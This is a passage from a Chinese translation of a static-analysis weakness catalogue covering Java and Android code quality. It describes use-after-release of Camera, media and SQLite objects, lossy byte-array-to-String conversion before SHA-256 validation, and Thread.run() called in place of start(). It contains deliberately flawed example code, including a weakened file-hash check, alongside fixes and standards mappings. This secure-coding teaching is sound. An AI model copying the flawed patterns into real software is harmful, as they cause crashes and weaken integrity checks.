class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：因为该问题的修复相当地复杂，您可能试图使用一个更简单的方法，例如在开始阅读前检查文件的大小。这种方法将导致应用程序容易受到文件系统 race condition 的攻击，凭借这个攻击者可以在文件大小检查和从文件调用读取数据之间使用恶意文件替换结构良好的文件。</p>
<h5 id="REFERENCES-47"><a href="#REFERENCES-47" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] EXP00-J. Do not ignore values returned by methods CERT</p>
<p>[2] FIO02-J. Detect and handle file-related errors CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 252, CWE ID 754</p>
<p>[4] Standards Mapping - MISRA C 2012 Rule 17.7</p>
<p>[5] Standards Mapping - MISRA C++ 2008 Rule 0-1-7</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 754</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h3 id="代码质量"><a href="#代码质量" class="headerlink" title="代码质量"></a>代码质量</h3><p>代码质量低会导致不可预知的行为。从用户角度来看，这种情况通常表现为可用性差。对于攻击者而言，它提供了以各种意想不到的方式为系统施压的机会。</p>
<p>Android Bad Practices: Use of Released Camera Resource</p>
<p>Android Bad Practices: Use of Released Media Resource</p>
<p>Android Bad Practices: Use of Released SQLite Resource</p>
<p>Code Correctness: Byte Array to String Conversion</p>
<p>Code Correctness: Call to Thread.run()</p>
<p>Code Correctness: Call to Thread.stop()</p>
<p>Code Correctness: Call to notify()</p>
<p>Code Correctness: Class Does Not Implement Cloneable</p>
<p>Code Correctness: Comparison of Boxed Primitive Types</p>
<p>Code Correctness: Comparison with NaN</p>
<p>Code Correctness: Constructor Invokes Overridable Function</p>
<p>Code Correctness: Erroneous Class Compare</p>
<p>Code Correctness: Erroneous Negative Value</p>
<p>Code Correctness: Erroneous String Compare</p>
<p>Code Correctness: Erroneous Zero Value</p>
<p>Code Correctness: Hidden Method</p>
<p>Code Correctness: Incorrect serialPersistentFields Modifier</p>
<p>Code Correctness: Invalid Call to Object.equals()</p>
<p>Code Correctness: Misleading Method Signature</p>
<p>Code Correctness: Non-Static Inner Class Implements Serializable</p>
<p>Code Correctness: Non-Synchronized Method Overrides Synchronized Method</p>
<p>Code Correctness: String Comparison of Float</p>
<p>Code Correctness: clone() Invokes Overridable Function</p>
<p>Code Correctness: null Argument to equals()</p>
<p>Code Correctness: readObject() Invokes Overridable Function</p>
<p>Dead Code: Empty Try Block</p>
<p>Dead Code: Expression is Always false</p>
<p>Dead Code: Expression is Always true</p>
<p>Dead Code: Unused Field</p>
<p>Dead Code: Unused Method</p>
<p>Null Dereference</p>
<p>Obsolete</p>
<p>Poor Style: Confusing Naming(class_and_member)</p>
<p>Poor Style: Confusing Naming(member_and_method)</p>
<p>Poor Style: Empty Synchronized Block</p>
<p>Poor Style: Identifier Contains Dollar Symbol ($)</p>
<p>Poor Style: Redundant Initialization</p>
<p>Poor Style: Value Never Read</p>
<p>Portability Flaw: File Separator</p>
<p>Portability Flaw: Locale Dependent Comparison</p>
<p>Portability Flaw: Native SQL</p>
<p>Race Condition: Class Initialization Cycle</p>
<p>Redundant Null Check</p>
<p>Unreleased Resource: Android Camera</p>
<p>Unreleased Resource: Android Media</p>
<p>Unreleased Resource: Android SQLite Database</p>
<p>Unreleased Resource: Database</p>
<p>Unreleased Resource: Files</p>
<p>Unreleased Resource: Sockets</p>
<p>Unreleased Resource: Streams</p>
<p>Unreleased Resource: Synchronization</p>
<h5 id="Android-Bad-Practices-Use-of-Internal-APIs"><a href="#Android-Bad-Practices-Use-of-Internal-APIs" class="headerlink" title="Android Bad Practices: Use of Internal APIs"></a>Android Bad Practices: Use of Internal APIs</h5><h5 id="ABSTRACT-49"><a href="#ABSTRACT-49" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序调用内部或隐藏的 API。</p>
<h5 id="EXPLANATION-50"><a href="#EXPLANATION-50" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>不建议开发人员使用未记录或隐藏的 API 构建其应用程序。 由于无法保证 Google 未来不会删除或更改这些 API，因此应避免使用它们，并且使用此类方法或字段具有破坏应用程序的较高风险。</p>
<h5 id="RECOMMENDATIONS-50"><a href="#RECOMMENDATIONS-50" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿使用内部或隐藏的 API，而是坚持使用 SDK API。</p>
<h5 id="REFERENCES-48"><a href="#REFERENCES-48" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Google Restrictions on non-SDK interfaces </p>
<h4 id="Android-Bad-Practices-Use-of-Released-Camera-Resource"><a href="#Android-Bad-Practices-Use-of-Released-Camera-Resource" class="headerlink" title="Android Bad Practices: Use of Released Camera Resource"></a>Android Bad Practices: Use of Released Camera Resource</h4><h5 id="ABSTRACT-50"><a href="#ABSTRACT-50" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>代码在 Camera 对象释放后对其进行了引用。</p>
<h5 id="EXPLANATION-51"><a href="#EXPLANATION-51" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 Camera 对象释放后，代码试图使用该对象。在未重新获取 Camera 对象的情况下任何对该资源的进一步引用都将抛出异常。如果未捕获该异常，可能会导致应用程序崩溃。</p>
<p>示例：以下代码使用切换按钮来打开和关闭照相机预览。用户轻按该按钮后，照相机预览停止，并释放照相机资源。但是，如果再按一次按钮，将调用之前释放的 Camera 对象中的 startPreview()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class ReuseCameraActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private Camera cam;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  private class CameraButtonListener implements OnClickListener &#123;</span><br><span class="line"></span><br><span class="line">      public void onClick(View v) &#123;</span><br><span class="line"></span><br><span class="line">          if (toggle) &#123;</span><br><span class="line"></span><br><span class="line">              cam.stopPreview();</span><br><span class="line"></span><br><span class="line">              cam.release();</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          else &#123;</span><br><span class="line"></span><br><span class="line">              cam.startPreview();</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          toggle = !toggle;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-51"><a href="#RECOMMENDATIONS-51" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请在处理完 Camera 实例后再释放该对象，虽然也可以从 onPause()、onStop() 或 onDestroy() 中调用 release()。如果应用程序不打算长期使用照相机，最好（建议）等到下次使用时再调用 release()。应用程序可在使用照相机之前通过 create() 重新获取。</p>
<h5 id="REFERENCES-49"><a href="#REFERENCES-49" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Camera, Android Developers</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 416</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Android-Bad-Practices-Use-of-Released-Media-Resource"><a href="#Android-Bad-Practices-Use-of-Released-Media-Resource" class="headerlink" title="Android Bad Practices: Use of Released Media Resource"></a>Android Bad Practices: Use of Released Media Resource</h4><h5 id="ABSTRACT-51"><a href="#ABSTRACT-51" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>代码在 Android 媒体对象释放后对其进行了引用。</p>
<h5 id="EXPLANATION-52"><a href="#EXPLANATION-52" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在媒体对象释放后，代码试图使用该对象。在未重新获取媒体对象的情况下任何对该资源的进一步引用都将抛出异常。如果未捕获该异常，可能会导致应用程序崩溃。</p>
<p>示例：以下代码使用切换按钮来切换媒体播放。用户按此按钮后，当前歌曲或视频就会停止，并将释放照相机资源。但是，如果再按一次按钮，将调用之前释放的媒体资源中的 start()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class ReuseMediaPlayerActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private MediaPlayer mp;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  private class PauseButtonListener implements OnClickListener &#123;</span><br><span class="line"></span><br><span class="line">      public void onClick(View v) &#123;</span><br><span class="line"></span><br><span class="line">          if (paused) &#123;</span><br><span class="line"></span><br><span class="line">              mp.pause();</span><br><span class="line"></span><br><span class="line">              mp.release();</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          else &#123;</span><br><span class="line"></span><br><span class="line">              mp.start();</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          paused = !paused;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-52"><a href="#RECOMMENDATIONS-52" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请在处理完媒体实例后再释放该对象，虽然也可以从 onPause()、onStop()，或 onDestroy() 中调用 release()。如果应用程序不打算长期使用任何媒体功能，最好（建议）等到下次使用时再调用 release()。应用程序应在使用之前重新获取并再次准备媒体对象。</p>
<h5 id="REFERENCES-50"><a href="#REFERENCES-50" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Media Player, Android Developers</p>
<p>[2] Audio Capture, Android Developers</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 416</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Android-Bad-Practices-Use-of-Released-SQLite-Resource"><a href="#Android-Bad-Practices-Use-of-Released-SQLite-Resource" class="headerlink" title="Android Bad Practices: Use of Released SQLite Resource"></a>Android Bad Practices: Use of Released SQLite Resource</h4><h5 id="ABSTRACT-52"><a href="#ABSTRACT-52" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>代码在 Android 数据库处理器释放后对其进行了引用。</p>
<h5 id="EXPLANATION-53"><a href="#EXPLANATION-53" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 Android SQLite 数据库处理器关闭后，代码仍试图使用它。在未重新建立数据库连接的情况下，对处理器的任何进一步引用都将抛出异常。如果未捕获该异常，可能会导致应用程序崩溃。</p>
<p>示例：以下代码可能来自将用户值暂时缓存在内存中，但可调用 flushUpdates() 将这些变化提交到磁盘中的程序。该方法会在将更新写入数据库后正确关闭数据库处理器。然而，当再次调用 flushUpdates() 时，数据库对象会在重新初始化之前被再次引用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class ReuseDBActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private myDBHelper dbHelper;</span><br><span class="line"></span><br><span class="line">  private SQLiteDatabase db;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onCreate(Bundle state) &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      db = dbHelper.getWritableDatabase();</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  private void flushUpdates() &#123;</span><br><span class="line"></span><br><span class="line">      db.insert(cached_data);     // flush cached data</span><br><span class="line"></span><br><span class="line">      dbHelper.close();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-53"><a href="#RECOMMENDATIONS-53" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请在处理完数据库后再释放该对象，虽然也可以从 onPause()、onStop(),或 onDestroy() 中调用 close()。如果应用程序不打算长期使用数据库，最好（建议）等到下次使用时再调用 close()。应用程序可在使用数据库处理器之前进行重新获取。</p>
<h5 id="REFERENCES-51"><a href="#REFERENCES-51" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Data Storage, Android Developers</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 416</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Code-Correctness-Byte-Array-to-String-Conversion"><a href="#Code-Correctness-Byte-Array-to-String-Conversion" class="headerlink" title="Code Correctness: Byte Array to String Conversion"></a>Code Correctness: Byte Array to String Conversion</h4><h5 id="ABSTRACT-53"><a href="#ABSTRACT-53" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将字节数组转换为 String 会导致数据丢失。</p>
<h5 id="EXPLANATION-54"><a href="#EXPLANATION-54" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在将字节数组的数据转换为 String 后，没有说明适用字符集外的数据会发生何种变化。这会导致数据丢失，或者在需要二进制数据来确保执行正确的安全措施时，安全级别降低。</p>
<p>示例 1：以下代码将数据转换为字符串，以便创建散列值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">FileInputStream fis = new FileInputStream(myFile);</span><br><span class="line"></span><br><span class="line">byte[] byteArr = byte[BUFSIZE];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">int count = fis.read(byteArr);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">String fileString = new String(byteArr);</span><br><span class="line"></span><br><span class="line">String fileSHA256Hex = DigestUtils.sha256Hex(fileString);</span><br><span class="line"></span><br><span class="line">// use fileSHA256Hex to validate file </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果文件的大小小于 BUFSIZE，只要 myFile 中的信息已编码为与默认字符集相同，此方式就会很有用。但是，如果使用不同的编码方式，或者为二进制文件，则信息将会丢失。进而导致生成的 SHA 散列值的可靠性降低，并且也将更容易产生冲突，在默认字符集外的数据由相同的值（如问号）表示时，尤其如此。</p>
<h5 id="RECOMMENDATIONS-54"><a href="#RECOMMENDATIONS-54" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>总体而言，应当永远不要将可能包含非字符数据的字节数组转换为 String 对象，因为这会破坏该代码的功能，且在某些情况下会造成更大的安全问题。事实上，很多情况下都不需要将字节数组转换为字符串，如果基于特定原因可以从二进制数据创建 String 对象，则必须先对其进行编码，使其适合于默认字符集。</p>
<p>示例 2：以下示例使用与示例 1 中不同的 API 变体来防止出现验证问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">FileInputStream fis = new FileInputStream(myFile);</span><br><span class="line"></span><br><span class="line">byte[] byteArr = byte[BUFSIZE];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">int count = fis.read(byteArr);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">byte[] fileSHA256 = DigestUtils.sha256(byteArr);</span><br><span class="line"></span><br><span class="line">// use fileSHA256 to validate file, comparing hash byte-by-byte.</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在这种情况中，可以使用一种直接的方式进行纠正，因为此 API 具有过载的变体，且其中一个变体接受字节数组，即使之后使用 DigestUtils.sha256() 的另一个过载变体（此变体将 FileInputStream 对象接受为其参数），也可对其进行简化。对于其他情况，可能要仔细考虑字节数组是否包含字符集外的数据，并且可能需要进一步的修改。</p>
<h5 id="REFERENCES-52"><a href="#REFERENCES-52" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] STR03-J. Do not encode noncharacter data as a string CERT</p>
<p>[2] When ‘EFBFBD’ and Friends Come Knocking: Observations of Byte Array to String Conversions GDS Security</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 486</p>
<h4 id="Code-Correctness-Call-to-Thread-run"><a href="#Code-Correctness-Call-to-Thread-run" class="headerlink" title="Code Correctness: Call to Thread.run()"></a>Code Correctness: Call to Thread.run()</h4><h5 id="ABSTRACT-54"><a href="#ABSTRACT-54" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序调用线程的 run() 方法，以此替代 start()。</p>
<h5 id="EXPLANATION-55"><a href="#EXPLANATION-55" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在多数情况下，直接调用 Thread 对象的 run() 方法会是一个 bug。程序员本想启用新的控制线程，却意外地调用了 run()，而不是 start()，因此，在调用者的控制线程中执行了 run() 方法。</p>
<p>例 1：以下代码摘自一个 Java 程序，其错误地调用了 run()，而没有调用 start()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  Thread thr = new Thread() &#123;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">thr.run();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-55"><a href="#RECOMMENDATIONS-55" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在多数情况下，用调用 start() 来取代调用 run()。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">    Thread thr = new Thread() &#123;</span><br><span class="line"></span><br><span class="line">      public void run() &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span 